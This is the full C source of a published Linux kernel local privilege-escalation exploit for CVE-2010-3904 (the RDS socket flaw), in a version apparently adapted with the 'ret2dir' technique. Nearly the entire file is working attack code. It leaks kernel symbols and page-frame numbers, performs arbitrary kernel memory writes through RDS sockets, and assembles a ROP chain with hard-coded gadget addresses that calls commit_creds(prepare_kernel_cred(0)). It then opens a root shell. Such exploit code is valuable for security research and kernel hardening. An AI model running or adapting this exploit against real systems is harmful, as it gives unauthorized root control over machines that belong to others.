/* 
 * Linux Kernel <= 2.6.36-rc8 RDS privilege escalation exploit
 * CVE-2010-3904
 * by Dan Rosenberg <drosenberg@vsecurity.com>
 *
 * Copyright 2010 Virtual Security Research, LLC
 *
 * The handling functions for sending and receiving RDS messages
 * use unchecked __copy_*_user_inatomic functions without any
 * access checks on user-provided pointers.  As a result, by
 * passing a kernel address as an iovec base address in recvmsg-style
 * calls, a local user can overwrite arbitrary kernel memory, which
 * can easily be used to escalate privileges to root.  Alternatively,
 * an arbitrary kernel read can be performed via sendmsg calls.
 *
 * This exploit is simple - it resolves a few kernel symbols,
 * sets the security_ops to the default structure, then overwrites
 * a function pointer (ptrace_traceme) in that structure to point
 * to the payload.  After triggering the payload, the original
 * value is restored.  Hard-coding the offset of this function
 * pointer is a bit inelegant, but I wanted to keep it simple and
 * architecture-independent (i.e. no inline assembly).
 *
 * The vulnerability is yet another example of why you shouldn't
 * allow loading of random packet families unless you actually
 * need them.
 *
 * Greets to spender, kees, taviso, hawkes, team lollerskaters,
 * joberheide, bla, sts, and VSR
 *
 */

/*
 * Modified to use the `ret2dir' technique (October 2013)
 * Vasileios P. Kemerlis <vpk@cs.columbia.edu>
 *
 * EDB-ID: 15285
 *
 * Tested on 2.6.33.6, 2.6.33.6-pax*
 *
 * NOTE(s):
 * 	- set `PAGE_OFFSET' and `KERN_HIGH' accordingly
 */

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>

#define RECVPORT	5555 
#define SENDPORT	6666

static unsigned long map_addr, map_addrs;

/* pagemap query result (see querypmap()) */
struct pmap_qres {
	unsigned long	btarget;	/* branch target 	*/
	size_t		pnum;		/* page number 		*/
};

#define PAGE_SIZE	4096
#define PATH_SZ		32		/* path size (/proc/<pid>/pagemap) */
#define PRESENT_MASK	(1ULL << 63) 	/* get bit 63 from a 64-bit integer */
#define PFN_MASK	((1ULL << 55) - 1)	/* get bits 0-54 from
						   a 64-bit integer */
#define PAGE_OFFSET	0xffff880000000000UL	/* kernel space */
#define	KERN_LOW	PAGE_OFFSET		/* range start */
#define KERN_HIGH	0xffff880080000000UL	/* range end */

#define	SYSLOG_OFFSET	11		/* (*syslog) offset in `security_ops' */
#define KLOGCTL_TYPE	10		/* return the size of the log buffer */

#define LOOP_CNT	16
#define	RESTORE_CONST	0x00746c7561666564

/* ROP gadgets; 2.6.33.6-pax */
#define STACK_PIVOT	0xffffffff810f0569
#define MAGIC		0xffff8819042002be
#define POP_RSP		0xffffffff810491c0
#define POP_RDI		0xffffffff810b80ad
#define POP_RBP		0xffffffff814e7a57
#define MOV_RBX_RAX	0xffffffff81028bd6
#define DEC_RAX		0xffffffff812913b5


/*
 * query the pagemap
 *
 * open /proc/<pid>/pagemap and try to find the 1st page from a range of
 * user space pages that has a synonym inside [KERN_LOW, KERN_HIGH]
 * (i.e., in the direct-mapped RAM region in kernel space)
 *
 * @pid:	the pid of the process that we are interested into
 * @vaddr:	starting virtual address (page-aligned)
 * @psize:	page size
 * @pnum:	number of pages in the range
 * returns:	a `struct pmap_qres' (i.e., the kernel address of a vaddr,
 * 			or 0 if no vaddr is kernel-mapped/present, and the
 * 			page number for vaddr)
 */
static struct pmap_qres
querypmap(pid_t pid, unsigned long vaddr, long psize, size_t pnum)
{
	/* path in /proc 	*/
	char 			path[PATH_SZ];

	/* pagemap entries	*/
	uint64_t 		*pentry	= NULL;

	/* pagemap file		*/
	FILE 			*fp	= NULL;

	/* return value		*/
	struct pmap_qres 	rval	= {0, 0};

	/* helper */
	unsigned long 		kaddr	= 0;

	
	/* initialize the pagemap entries */
	if ((pentry = calloc(pnum, sizeof(uint64_t))) == NULL) {
		printf("[-] failed to allocate memory for pagemap "	\
				"entries (%s), aborting!\n",
				strerror(errno));
		exit(1);
	}

	/* cleanup */
	memset(path, 0, PATH_SZ);

	/* format the path variable */
	if (snprintf(path, PATH_SZ, "/proc/%d/pagemap", pid) >= PATH_SZ) {
		/* failed */
			printf("[-] failed to set the path for "	\
				"/proc/%d/pagemap (%s), aborting!\n",
				pid,
				path);
		exit(1);
	}
	
	/* open the pagemap file */
	if ((fp = fopen(path, "r")) == NULL) {
		/* failed */
		printf("[-] failed to open %s (%s), aborting!\n",
				path,
				strerror(errno));
		exit(1);
	}

	/* seek to the appropriate place */
	if (fseek(fp, (vaddr / psize) * sizeof(uint64_t), SEEK_CUR) == -1) {
		/* failed */
		printf("[-] failed to seek in pagemap (%s), aborting!\n",
				strerror(errno));
		exit(1);
	}

	/* read the corresponding pagemap entries */
	if (fread(pentry, sizeof(uint64_t), pnum, fp) < 0) {
		printf("[-] failed while reading "			\
				"pagemap entries (%s), aborting!\n",
			strerror(errno));
		exit(1);
	}
	
	/* iterate the pagemap entries */
	vaddr += ((pnum - 1) * psize);
	while (pnum > 0) {
		/* check the present bit */
		if ((pentry[pnum - 1] & PRESENT_MASK) == 0) {
			/* page not present or invalid PFN */
			printf("\r[*] %#lx is not present in low memory  ",
	                                         vaddr);

			/* proper accounting */
			kaddr	= 0;
			vaddr	-= psize;
			pnum--;
			
			/* continue with the next page */	
			continue;
		}

		/* get the kernel-mapped address of vaddr */
		kaddr = ((pentry[pnum - 1] & PFN_MASK) * psize)	+
			PAGE_OFFSET 				+
			(vaddr & (psize - 1));

		/* verbose */
		printf("\r[?] %#lx is kernel-mapped at %#lx",
				vaddr,
				kaddr);
		
		/* valid match ? */
		if (kaddr >= KERN_LOW && kaddr <= KERN_HIGH) 
			/* yeah baby */
			break;

		/* proper accounting */
		kaddr	= 0;
		vaddr	-= psize;
		pnum--;
	}

	/* cleanup */
	fclose(fp);
	printf("\n");
	
	/* prepare the query result and return */
	rval.btarget	= kaddr;
	rval.pnum	= pnum - 1;
	return rval;
}

/*
 * 	i. we begin with acquiring memory pages in user space, progressively,
 * 		and check if their synonyms fall inside the direct-mapped RAM
 * 		region in kernel space (this is done via leaking the PFN of each
 * 		page via /proc/<pid>/pagemap)
 *
 * 	ii. upon finding two user pages whose directly-mapped counterparts fall
 * 		inside a RW(X) region in kernel (e.g., say 0x7f77e5bf3000 is
 * 		directly-mapped at 0xffff880001c00000), we copy the respective
 * 		data structures to the user pages, thus making them available to
 * 		kernel space as well (via their synonym pages in the
 * 		direct-mapped region)
 */
static void
map_synonyms(void)
{
	struct 	pmap_qres res0	= {0, 0};	/* kernel-level address of the
						tampered-with data structure */
	struct 	pmap_qres res1	= {0, 0};	/* kernel-level address of the
						tampered-with data structure */


	/* allocate 2 * PAGE_SIZE bytes in user space */
	if ((map_addr = (unsigned long)mmap(NULL,
			2 * PAGE_SIZE,
			PROT_READ | PROT_WRITE, 
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, 
			-1,
			0)) == (unsigned long)MAP_FAILED) {
		/* failed */
		printf("[-] failed to mmap memory (%s), aborting!\n",
				strerror(errno));
		exit(1);
	}

	/* see if user space is kernel-mapped */
	res0 = querypmap(getpid(),
			map_addr,
			PAGE_SIZE,
			1);
	
	res1 = querypmap(getpid(),
			map_addr + PAGE_SIZE,
			PAGE_SIZE,
			1);
	
	/* bad luck; try again */
	while (	res0.btarget == 0 ||
		res1.btarget == 0 ||
		(res0.btarget != (res1.btarget - PAGE_SIZE))	) {
		/* allocate 2 * PAGE_SIZE bytes in user space */
		if ((map_addr = (unsigned long)mmap(NULL,
			2 * PAGE_SIZE,
			PROT_READ | PROT_WRITE, 
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
			-1,
			0)) == (unsigned long)MAP_FAILED) {
			/* failed */
			printf("[-] failed to mmap memory (%s), aborting!\n",
				strerror(errno));
				exit(1);
			}
	
		/* see if user space is kernel-mapped */
		res0 = querypmap(getpid(),
				map_addr,
				PAGE_SIZE,
				1);
		
		res1 = querypmap(getpid(),
				map_addr + PAGE_SIZE,
				PAGE_SIZE,
				1);
	}

	/* update the globals */
	map_addr += res0.pnum * PAGE_SIZE;
	map_addrs = res0.btarget;
	
	/* paranoid */
	if (mlock((void *)map_addr, 2 * PAGE_SIZE) == -1) {
		/* failed */
		printf("[-] failed to lock memory (%s), aborting!\n",
			strerror(errno));
		exit(1);
	}
}

int
prep_sock(int port)
{
	int			s, ret;
	struct sockaddr_in	addr;


	s = socket(PF_RDS, SOCK_SEQPACKET, 0);

	if (s < 0) {
		printf("[-] could not open socket\n");
		exit(-1);
	}
	
	memset(&addr, 0, sizeof(addr));

	addr.sin_addr.s_addr	= inet_addr("127.0.0.1");
	addr.sin_family		= AF_INET;
	addr.sin_port		= htons(port);

	ret = bind(s, (struct sockaddr *)&addr, sizeof(addr));

	if (ret < 0) {
		printf("[-] could not bind socket\n");
		exit(-1);
	}

	return s;
}

void
get_message(unsigned long address, int sock)
{
	recvfrom(	sock,
			(void *)address,
			sizeof(void *),
			0,
			NULL,
			NULL	);
}

void
send_message(unsigned long value, int sock)
{
	int			ret;
	struct sockaddr_in	recvaddr;
	struct msghdr		msg;
	struct iovec		iov;
	unsigned long		buf;


	memset(&recvaddr, 0, sizeof(recvaddr));
	recvaddr.sin_port		= htons(RECVPORT);
	recvaddr.sin_family		= AF_INET;
	recvaddr.sin_addr.s_addr	= inet_addr("127.0.0.1");

	memset(&msg, 0, sizeof(msg));
	
	msg.msg_name			= &recvaddr;
	msg.msg_namelen			= sizeof(recvaddr);
	msg.msg_iovlen			= 1;
	
	buf				= value;

	iov.iov_len			= sizeof(buf);
	iov.iov_base			= &buf;

	msg.msg_iov			= &iov;

	ret				= sendmsg(sock, &msg, 0);

	if (ret < 0) {
		printf("[-] something went wrong sending\n");
		exit(-1);
	}
}

void
write_to_mem(	unsigned long addr,
		unsigned long value,
		int sendsock,
		int recvsock	)
{
	if (!fork()) {
		sleep(1);
		send_message(value, sendsock);
		exit(1);
	}
	else {
		get_message(addr, recvsock);
		wait(NULL);
	}
}

/* thanks spender... */
unsigned long
get_kernel_sym(char *name)
{
	FILE		*f;
	unsigned long	addr;
	char		dummy;
	char		sname[512];
	struct utsname	ver;
	int		ret;
	int		rep		= 0;
	int		oldstyle	= 0;


	f			= fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		f		= fopen("/proc/ksyms", "r");
		if (f == NULL)
			goto fallback;
		oldstyle	= 1;
	}

repeat:
	ret = 0;
	while (ret != EOF) {
		if (!oldstyle)
			ret = fscanf(	f,
					"%p %c %s\n",
					(void **)&addr,
					&dummy,
					sname	);
		else {
			ret = fscanf(	f,
					"%p %s\n",
					(void **)&addr,
					sname	);
			if (ret == 2) {
				char *p;
				if (	strstr(sname, "_O/") ||
					strstr(sname, "_S."))
					continue;
				p = strrchr(sname, '_');
				if (p > (	(char *)sname + 5) &&
						!strncmp(p - 3, "smp", 3)) {
					p = p - 4;
					while (	p > (char *)sname &&
							*(p - 1) == '_')
						p--;
					*p = '\0';
				}
			}
		}
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			fprintf(	stdout,
					" [+] resolved %s to %p%s\n",
					name,
					(void *)addr,
					rep ? " (via System.map)" : "");
			fclose(f);
			return addr;
		}
	}

	fclose(f);
	if (rep)
		return 0;
fallback:
	/* didn't find the symbol, let's retry with the System.map
	   dedicated to the pointlessness of Russell Coker's SELinux
	   test machine (why does he keep upgrading the kernel if
	   "all necessary security can be provided by SE Linux"?)
	*/
	uname(&ver);
	if (strncmp(ver.release, "2.6", 3))
		oldstyle = 1;
	sprintf(sname, "/boot/System.map-%s", ver.release);
	f 	= fopen(sname, "r");
	if (f == NULL)
		return 0;
	rep	= 1;
	goto repeat;
}

int
main(int argc, char *argv[])
{
	unsigned long	sec_ops, def_ops, cap_syslog, cap_ptrace_achk,
			target, pkcred, ccreds; 
	int		sendsock, recvsock, i;
	struct utsname	ver;


	printf("[^] Linux kernel >= 2.6.30 RDS socket exploit\n");
	printf("[^] by Dan Rosenberg (`ret2dir' by Vasileios P. Kemerlis)\n");

	uname(&ver);

	if (strncmp(ver.release, "2.6.3", 5)) {
		printf("[-] your kernel is not vulnerable.\n");
		return -1;
	}	

	/* resolve addresses of relevant symbols */
	printf("[+] resolving kernel addresses...\n");
	sec_ops		= get_kernel_sym("security_ops");
	def_ops		= get_kernel_sym("default_security_ops");
	cap_ptrace_achk	= get_kernel_sym("cap_ptrace_access_check");
	cap_syslog	= get_kernel_sym("cap_syslog");
	ccreds		= get_kernel_sym("commit_creds");
	pkcred		= get_kernel_sym("prepare_kernel_cred");

	if (	!sec_ops 	||
		!def_ops 	||
		!cap_syslog 	||
		!cap_ptrace_achk||
		!ccreds		||
		!pkcred	) {
		printf("[-] failed to resolve kernel symbols.\n");
		return -1;
	}

	sendsock	= prep_sock(SENDPORT);
	recvsock	= prep_sock(RECVPORT);

	/* try to get two synonym pages */
	map_synonyms();
	/* 2KB scratch space */
	map_addr	+= (PAGE_SIZE >> 1);
	map_addrs	+= (PAGE_SIZE >> 1);

	/* reset `security_ops' */
	printf("[+] overwriting `security_ops' with `&default_security_ops'\n");
	write_to_mem(sec_ops, def_ops, sendsock, recvsock);

	/* 
	 * overload `security_op.{name, ptrace_access_check}'
	 * with stage 2 stack pivot
	 */
	target		= def_ops;
	printf(	"[+] overwriting "
		"`default_security_ops.{name, ptrace_access_check}' "
		"with stage 2 stack pivot\n");
	/* stage 2 stack pivoting */
	write_to_mem(target, MAGIC, sendsock, recvsock);
	target		+= sizeof(unsigned long);
						/* pop %rsp	# ret */
	write_to_mem(target, POP_RSP, sendsock, recvsock);
	target		+= sizeof(unsigned long);
					/* ROP payload (rest part) address */
	write_to_mem(target, map_addrs, sendsock, recvsock);

	/* overwrite `security_ops.syslog' with stage 1 stack pivot */
	target		= def_ops + (SYSLOG_OFFSET * sizeof(unsigned long *)); 
	printf("[+] overwriting `default_security_ops.syslog'\n");
	/* 
	 * xchg %rax, %rbp # add %al, (%rax) # mov -0xe0(%rbp), %rax 	#
	 * add $0xd8, %rsp # pop %rbx # pop %r12 # pop %r13 # pop %r14	#
	 * pop %r15 # leaveq # retq
	 */	
	write_to_mem(target, STACK_PIVOT, sendsock, recvsock);
	
	/* 
	 * ROP payload: w00t
	 * 	i.	the fields `name' and `ptrace_access_check'
	 * 		of `default_security_ops' are overloaded for
	 * 		storing the ROP payload to perform stage 2
	 * 		stack pivoting
	 *
	 * 	ii.	the bulk part of the ROP payload is located
	 * 		2KB above the beginning of the synonym page
	 */

	/* w00t; commit_creds(prepare_kernel_cred(0) */
						/* pop %rdi	# retq */
	*(unsigned long *)map_addr	= POP_RDI;
	map_addr			+= sizeof(unsigned long);
	map_addrs			+= sizeof(unsigned long);
						/* 0 */
	*(unsigned long *)map_addr	= 0x0;
	map_addr			+= sizeof(unsigned long);
	map_addrs			+= sizeof(unsigned long);
						/* [^ -] */
	*(unsigned long *)map_addr	= pkcred;
	map_addr			+= sizeof(unsigned long);
	map_addrs			+= sizeof(unsigned long);
						/* [- ^] */
	*(unsigned long *)map_addr	= ccreds;
	map_addr			+= sizeof(unsigned long);
	map_addrs			+= sizeof(unsigned long);

	/*
	 * reliable kernel continuation; restore the CPU state
	 *
	 * 			#------------------- "p0wn()"
	 *			|			^
	 * 			V			|
	 * sys_syslog() -> do_syslog() -> security_syslog()
	 */
						/* pop %rbp	# retq */
	*(unsigned long *)map_addr	= POP_RBP;
	map_addr			+= sizeof(unsigned long);
	map_addrs			+= sizeof(unsigned long);
						/* `leaveq' fix */
	*(unsigned long *)map_addr	= map_addrs +  2 * sizeof(unsigned long);
	map_addr			+= sizeof(unsigned long);
	map_addrs			+= sizeof(unsigned long);
			/* mov %rbx, %rax # pop %rbx # leaveq 	# retq */
	*(unsigned long *)map_addr	= MOV_RBX_RAX;
	map_addr			+= sizeof(unsigned long);
	map_addrs			+= sizeof(unsigned long);
	*(unsigned long *)map_addr	= MAGIC;
	map_addr			+= sizeof(unsigned long);
	map_addrs			+= sizeof(unsigned long);
						/* pop %rbp	# retq */
	*(unsigned long *)map_addr	= POP_RBP;
	map_addr			+= sizeof(unsigned long);
	map_addrs			+= sizeof(unsigned long);
						/* `leaveq' fix */
	*(unsigned long *)map_addr	= map_addrs + 2 * sizeof(unsigned long);
	map_addr			+= sizeof(unsigned long);
	map_addrs			+= sizeof(unsigned long);

	/* repeat... */
	for (i = 0; i < LOOP_CNT; i++) {
					/* dec %rax # leaveq	# retq */
		*(unsigned long *)map_addr	= DEC_RAX;
		map_addr			+= sizeof(unsigned long);
		map_addrs			+= sizeof(unsigned long);
						/* `leaveq' fix */
		*(unsigned long *)map_addr	= map_addrs + 2 * sizeof(unsigned long);
		map_addr			+= sizeof(unsigned long);
		map_addrs			+= sizeof(unsigned long);
	}

	/* 
	 * xchg %rax, %rbp # add %al, (%rax) # mov -0xe0(%rbp), %rax 	#
	 * add $0xd8, %rsp # pop %rbx # pop %r12 # pop %r13 # pop %r14	#
	 * pop %r15 # leaveq # retq
	 */	
	*(unsigned long *)map_addr	= STACK_PIVOT;
	
	/* trigger the ROP payload; p0wn */
	printf("[+] triggering the ROP payload\n");
	klogctl(KLOGCTL_TYPE, NULL, -1);
	
	/* restore `default_security_ops' */
	printf("[+] restoring `default_security_ops'\n");
	target		= def_ops;
	write_to_mem(target, RESTORE_CONST, sendsock, recvsock);
	target		+= sizeof(unsigned long *);
	write_to_mem(target, 0x0, sendsock, recvsock);
	target		+= sizeof(unsigned long *);
	write_to_mem(target, cap_ptrace_achk, sendsock, recvsock);
	target		= def_ops + (SYSLOG_OFFSET * sizeof(unsigned long *)); 
	write_to_mem(target, cap_syslog, sendsock, recvsock);

	/* w00t? */
	if (getuid()) {
		printf("[-] exploit failed to get root\n");
		return -1;
	}

	printf("[*] Got r00t!\n");
	execl("/bin/sh", "sh", NULL);

	/* make the compiler happy :) */
	return 0;
}
